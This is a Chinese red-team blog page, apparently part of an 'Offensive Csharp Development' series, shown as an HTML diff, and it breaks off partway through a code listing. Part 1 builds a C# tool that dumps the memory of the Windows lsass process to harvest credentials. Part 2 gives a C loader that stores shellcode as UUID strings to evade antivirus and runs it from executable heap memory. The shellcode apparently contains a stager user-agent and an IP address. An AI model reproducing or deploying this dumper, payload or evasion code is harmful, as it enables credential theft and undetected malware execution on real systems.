@@ -1,0 +1,1524 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="要有所行动,然后认识自己。——〈法国作家)蒙田  Offensive Csharp Development 1-5合集，该系列文章将简单的介绍Csharp在渗透测试中的使用方法，主要为win32的使用以及一些库的调用。本文为第一篇文章，将以一个dump lsass进程的程序为例，介绍Csharp的简单使用，文章不会介绍Csharp基础性的东西，对此有兴趣的可以移步微软官方文档，或各类Csharp基">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Offensive Csharp Development">
+<meta property="og:url" content="https://lengjibo.github.io/CsharpDV/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="要有所行动,然后认识自己。——〈法国作家)蒙田  Offensive Csharp Development 1-5合集，该系列文章将简单的介绍Csharp在渗透测试中的使用方法，主要为win32的使用以及一些库的调用。本文为第一篇文章，将以一个dump lsass进程的程序为例，介绍Csharp的简单使用，文章不会介绍Csharp基础性的东西，对此有兴趣的可以移步微软官方文档，或各类Csharp基">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/0.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/1.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/2.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/3.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/4.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/5.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/6.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/7.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/8.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/9.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/10.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/11.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/12.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/13.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/14.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/15.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/16.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/17.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/18.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/amsi7archi.jpeg">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/19.png">
+<meta property="og:image" content="https://lengjibo.github.io/images/CsharpDV/20.png">
+<meta property="og:updated_time" content="2021-03-29T13:41:27.292Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Offensive Csharp Development">
+<meta name="twitter:description" content="要有所行动,然后认识自己。——〈法国作家)蒙田  Offensive Csharp Development 1-5合集，该系列文章将简单的介绍Csharp在渗透测试中的使用方法，主要为win32的使用以及一些库的调用。本文为第一篇文章，将以一个dump lsass进程的程序为例，介绍Csharp的简单使用，文章不会介绍Csharp基础性的东西，对此有兴趣的可以移步微软官方文档，或各类Csharp基">
+<meta name="twitter:image" content="https://lengjibo.github.io/images/CsharpDV/0.png">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/CsharpDV/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Offensive Csharp Development | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Beranda</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Tentang</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategori</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Arsip</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/CsharpDV/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Offensive Csharp Development
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Diposting di</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2021-03-29 21:14:50 / Updated at: 21:41:27" itemprop="dateCreated datePublished" datetime="2021-03-29T21:14:50+08:00">2021-03-29</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Di</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>要有所行动,然后认识自己。<br>——〈法国作家)蒙田</p>
+<hr>
+<p>Offensive Csharp Development 1-5合集，该系列文章将简单的介绍Csharp在渗透测试中的使用方法，主要为win32的使用以及一些库的调用。本文为第一篇文章，将以一个dump lsass进程的程序为例，介绍Csharp的简单使用，文章不会介绍Csharp基础性的东西，对此有兴趣的可以移步微软官方文档，或各类Csharp基础教学书籍、视频进行学习。</p>
+<a id="more"></a>
+<h2 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h2><h3 id="win32的调用"><a href="#win32的调用" class="headerlink" title="win32的调用"></a>win32的调用</h3><p>在整个Csharp的使用过程中，最重要的就是win32的调用，由于Csharp不向C/C++可以直接调用win32api进行使用，所以我们一般使用一种叫做P/Invoke的方法在DLL中使用win32api。具体可参考官方文档：<a href="https://docs.microsoft.com/en-us/archive/msdn-magazine/2003/july/net-column-calling-win32-dlls-in-csharp-with-p-invoke" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/archive/msdn-magazine/2003/july/net-column-calling-win32-dlls-in-csharp-with-p-invoke</a></p>
+<p>其基本调用形式可以参考下面的使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[DllImport(&quot;User32.dll&quot;)] static extern Boolean MessageBeep(UInt32 beepType);</span><br></pre></td></tr></table></figure>
+<p>其数据类型的转换如下表：</p>
+<p><img src="../images/CsharpDV/0.png" alt="image.png"></p>
+<p>windows数据类型的转换如下：</p>
+<p><img src="../images/CsharpDV/1.png" alt="image.png"></p>
+<p>其他类表</p>
+<p><img src="../images/CsharpDV/2.png" alt="image.png"></p>
+<p>那么如果一个一个的来进行修改无非是费时费力的，这里我们一般使用一个叫做<a href="http://www.pinvoke.net/的网站来帮我们实现api的调用过程，当然其也支持vs插件。比如我们需要一个messagebox的api，就可以直接在该网站上搜索该api" target="_blank" rel="noopener">http://www.pinvoke.net/的网站来帮我们实现api的调用过程，当然其也支持vs插件。比如我们需要一个messagebox的api，就可以直接在该网站上搜索该api</a></p>
+<p><img src="../images/CsharpDV/3.png" alt="image.png"></p>
+<p>其给出了C#以及VB的调用方法，C#的调用方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[DllImport(&quot;user32.dll&quot;, SetLastError = true, CharSet= CharSet.Auto)]</span><br><span class="line">public static extern int MessageBox(int hWnd, String text, String caption, uint type);</span><br></pre></td></tr></table></figure>
+<p>下面我们新建一个Csharp程序，然后来使用这个API。记得加入using System.Runtime.InteropServices;因为DllImport是System.Runtime.InteropServices命名空间下的一个属性类，其功能是提供从非托管DLL导出的函数的必要调用信息。</p>
+<p>然后放入我们的代码并调用它：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Timers;</span><br><span class="line">using System.Windows.Forms;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace Basic3</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    class Program </span><br><span class="line">    &#123;</span><br><span class="line">        [DllImport(&quot;user32.dll&quot;, SetLastError = true, CharSet = CharSet.Auto)]</span><br><span class="line">        public static extern int MessageBox(int hWnd, String text, String caption, uint type);</span><br><span class="line">        static void Main(string[] args) &#123;</span><br><span class="line">            MessageBox(0, &quot;Hello World!&quot;, &quot;Hello Dialog&quot;, 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行，成功弹框。</p>
+<p><img src="../images/CsharpDV/4.png" alt="image.png"></p>
+<h3 id="SharpDump"><a href="#SharpDump" class="headerlink" title="SharpDump"></a>SharpDump</h3><p>知道了如何调用win32，下面我们来编写一个dump lsass进程的小程序。dump lsass进程网上有很多的demo，其实更多的还是在使用MiniDumpWriteDump来进行内存dump，其原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MiniDumpWriteDump</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE                            hProcess,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD                             ProcessId,</span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE                            hFile,</span></span></span><br><span class="line"><span class="function"><span class="params">  MINIDUMP_TYPE                     DumpType,</span></span></span><br><span class="line"><span class="function"><span class="params">  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,</span></span></span><br><span class="line"><span class="function"><span class="params">  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,</span></span></span><br><span class="line"><span class="function"><span class="params">  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>那么这时候我们便可以用之前说的方法来调用这个api来进行使用了。之前的调用方法我们一般称为托管 调用 非托管，关于一些名词的解释请自行百度，这里不再过多解释。除了之前的方法还有一种就是调用UnmanagedFunctionPointer以获得自定义调用约定。一般用以回调函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[UnmanagedFunctionPointer(CallingConvention.Cdecl)]</span><br><span class="line">public static delegate &#123;callback&#125;;</span><br></pre></td></tr></table></figure>
+<p>那我们就可以这样来写</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[UnmanagedFunctionPointer(CallingConvention.Cdecl)]</span><br><span class="line">private delegate bool  MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, SafeHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);</span><br></pre></td></tr></table></figure>
+<p>一般的此类函数的调用方法如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var MyFunctionPointer = (DMyUserCallFunction)Marshal.GetDelegateForFunctionPointer(AddressOfFunction, typeof(DMyUserCallFunction));</span><br></pre></td></tr></table></figure>
+<p>那我们这里便是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IntPtr createPtr = GetProcAddress(LoadLibrary(&quot;Dbghelp.dll&quot;), &quot;MiniDumpWriteDump&quot;);</span><br><span class="line">MiniDumpWriteDump miniDumpWriteDump = (MiniDumpWriteDump)Marshal.GetDelegateForFunctionPointer(createPtr, typeof(MiniDumpWriteDump));</span><br></pre></td></tr></table></figure>
+<p>那我们这里便是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IntPtr createPtr = GetProcAddress(LoadLibrary(&quot;Dbghelp.dll&quot;), &quot;MiniDumpWriteDump&quot;);</span><br><span class="line">MiniDumpWriteDump miniDumpWriteDump = (MiniDumpWriteDump)Marshal.GetDelegateForFunctionPointer(createPtr, typeof(MiniDumpWriteDump));</span><br></pre></td></tr></table></figure>
+<p>GetProcAddress、LoadLibrary可以这样导入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//import Win32API</span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">public static extern IntPtr LoadLibrary(string dll);</span><br><span class="line"></span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">public static extern IntPtr GetProcAddress(IntPtr hModule, string name);</span><br></pre></td></tr></table></figure>
+<p>下面就是查找进程的问题了，Csharp提供了Process类，可以直接使用进程名称或者进程ID来进行查找：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process.GetProcessById</span><br></pre></td></tr></table></figure>
+<p>最后就是MINIDUMP_TYPE的问题了，这个关系到dump时如何dump的问题，其原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> _MINIDUMP_TYPE &#123;</span><br><span class="line">  MiniDumpNormal,</span><br><span class="line">  MiniDumpWithDataSegs,</span><br><span class="line">  MiniDumpWithFullMemory,</span><br><span class="line">  MiniDumpWithHandleData,</span><br><span class="line">  MiniDumpFilterMemory,</span><br><span class="line">  MiniDumpScanMemory,</span><br><span class="line">  MiniDumpWithUnloadedModules,</span><br><span class="line">  MiniDumpWithIndirectlyReferencedMemory,</span><br><span class="line">  MiniDumpFilterModulePaths,</span><br><span class="line">  MiniDumpWithProcessThreadData,</span><br><span class="line">  MiniDumpWithPrivateReadWriteMemory,</span><br><span class="line">  MiniDumpWithoutOptionalData,</span><br><span class="line">  MiniDumpWithFullMemoryInfo,</span><br><span class="line">  MiniDumpWithThreadInfo,</span><br><span class="line">  MiniDumpWithCodeSegs,</span><br><span class="line">  MiniDumpWithoutAuxiliaryState,</span><br><span class="line">  MiniDumpWithFullAuxiliaryState,</span><br><span class="line">  MiniDumpWithPrivateWriteCopyMemory,</span><br><span class="line">  MiniDumpIgnoreInaccessibleMemory,</span><br><span class="line">  MiniDumpWithTokenInformation,</span><br><span class="line">  MiniDumpWithModuleHeaders,</span><br><span class="line">  MiniDumpFilterTriage,</span><br><span class="line">  MiniDumpWithAvxXStateContext,</span><br><span class="line">  MiniDumpWithIptTrace,</span><br><span class="line">  MiniDumpScanInaccessiblePartialPages,</span><br><span class="line">  MiniDumpValidTypeFlags</span><br><span class="line">&#125; MINIDUMP_TYPE;</span><br></pre></td></tr></table></figure>
+<p>这里我们如果定义成MINIDUMP_TYPE类型，那么我们将需要把这些内容全部自己定义出来，而我们刚才把其定义成立Int，此时则只需要给其传递一个2进去即可，即表示完整dump。</p>
+<p>最后效果如下：</p>
+<p><img src="../images/CsharpDV/5.png" alt="image.png"></p>
+<p>当然这个程序还是又很多其他的问题的，比如还可以加入自动提权等等。最后的代码可以在这里找到：<a href="https://github.com/lengjibo/OffenSiveCSharp" target="_blank" rel="noopener">https://github.com/lengjibo/OffenSiveCSharp</a></p>
+<h2 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h2><p>本文是OffenSive Csharp Development的第二篇文章，来将UUID免杀方法转换成C#进行使用。原来的UUID方法源码如下，本质还是api滥用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Rpc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"Rpcrt4.lib"</span>)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* uuids[] = &#123; <span class="string">"0089e8fc-0000-8960-e531-d2648b52308b"</span>,<span class="string">"528b0c52-8b14-2872-0fb7-4a2631ff31c0"</span>,<span class="string">"7c613cac-2c02-c120-cf0d-01c7e2f05257"</span>,<span class="string">"8b10528b-3c42-d001-8b40-7885c0744a01"</span>,<span class="string">"488b50d0-8b18-2058-01d3-e33c498b348b"</span>,<span class="string">"ff31d601-c031-c1ac-cf0d-01c738e075f4"</span>,<span class="string">"3bf87d03-247d-e275-588b-582401d3668b"</span>,<span class="string">"588b4b0c-011c-8bd3-048b-01d089442424"</span>,<span class="string">"59615b5b-515a-e0ff-585f-5a8b12eb865d"</span>,<span class="string">"74656e68-6800-6977-6e69-54684c772607"</span>,<span class="string">"ff31d5ff-5757-5757-5768-3a5679a7ffd5"</span>,<span class="string">"000084e9-5b00-c931-5151-6a0351516850"</span>,<span class="string">"53000000-6850-8957-9fc6-ffd5eb705b31"</span>,<span class="string">"006852d2-4002-5284-5252-53525068eb55"</span>,<span class="string">"d5ff3b2e-c689-c383-5031-ff57576aff53"</span>,<span class="string">"062d6856-7b18-d5ff-85c0-0f84c3010000"</span>,<span class="string">"f685ff31-0474-f989-eb09-68aac5e25dff"</span>,<span class="string">"68c189d5-2145-315e-ffd5-31ff576a0751"</span>,<span class="string">"b7685056-e057-ff0b-d5bf-002f000039c7"</span>,<span class="string">"ff31b774-91e9-0001-00e9-c9010000e88b"</span>,<span class="string">"2fffffff-6b31-566a-00fe-dc7a2d31c9e7"</span>,<span class="string">"42b51e28-625f-f5a3-6442-792da2d8f774"</span>,<span class="string">"c764c1ca-fec2-b232-360a-a0904efad447"</span>,<span class="string">"d98ba404-65e6-8fa1-bee4-b69563f0b446"</span>,<span class="string">"60f88520-b15e-a0f8-59ef-9eb2c6e6f95d"</span>,<span class="string">"5500078e-6573-2d72-4167-656e743a204d"</span>,<span class="string">"6c697a6f-616c-352f-2e30-2028636f6d70"</span>,<span class="string">"62697461-656c-203b-4d53-49452031302e"</span>,<span class="string">"57203b30-6e69-6f64-7773-204e5420362e"</span>,<span class="string">"57203b32-574f-3436-3b20-54726964656e"</span>,<span class="string">"2e362f74-3b30-5420-6f75-63683b204d41"</span>,<span class="string">"534a5053-0d29-000a-91a8-10b7da807fab"</span>,<span class="string">"2f1623c7-614b-ebbd-a514-6f904bdf5a58"</span>,<span class="string">"1f5557e0-6adb-7456-c2a1-9c9f32da910d"</span>,<span class="string">"952d1001-8eef-7249-3a2b-9e598e85a6ad"</span>,<span class="string">"98c69cb6-7d10-1f09-60a3-4aeabe4af549"</span>,<span class="string">"d618c78a-2260-1751-b8d6-61d38a81373e"</span>,<span class="string">"3d1c3d6a-f3c5-57a0-0204-4457c1142371"</span>,<span class="string">"6c8708c2-6b94-c189-d92b-cc6b62253fbb"</span>,<span class="string">"f102569f-4d54-914d-4e89-5bda5ff092a5"</span>,<span class="string">"cfafb2ac-e2bb-b0af-ca5b-08834c927ab5"</span>,<span class="string">"07d2b997-8fc9-80b7-fc26-3da3d19e2942"</span>,<span class="string">"780bcd05-11c2-4f86-6657-dae24b98cc46"</span>,<span class="string">"febde54d-2cc7-d3c4-e5c0-f943cad41d5a"</span>,<span class="string">"6800da73-b5f0-56a2-ffd5-6a4068001000"</span>,<span class="string">"00006800-0040-6857-58a4-53e5ffd593b9"</span>,<span class="string">"00000000-d901-5351-89e7-576800200000"</span>,<span class="string">"12685653-8996-ffe2-d585-c074c68b0701"</span>,<span class="string">"75c085c3-58e5-e8c3-a9fd-ffff31302e31"</span>,<span class="string">"32342e39-312e-3434-0012-345678000000"</span> &#125;; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">//获得可执行的句柄</span></span><br><span class="line">  <span class="keyword">void</span>* ha = HeapAlloc(hc, <span class="number">0</span>, <span class="number">0x100000</span>);<span class="comment">//申请堆空间</span></span><br><span class="line">  <span class="keyword">if</span> (ha == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"内存申请失败！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  DWORD_PTR hptr = (DWORD_PTR)ha;</span><br><span class="line">  <span class="keyword">int</span> elems = <span class="keyword">sizeof</span>(uuids) / <span class="keyword">sizeof</span>(uuids[<span class="number">0</span>]);<span 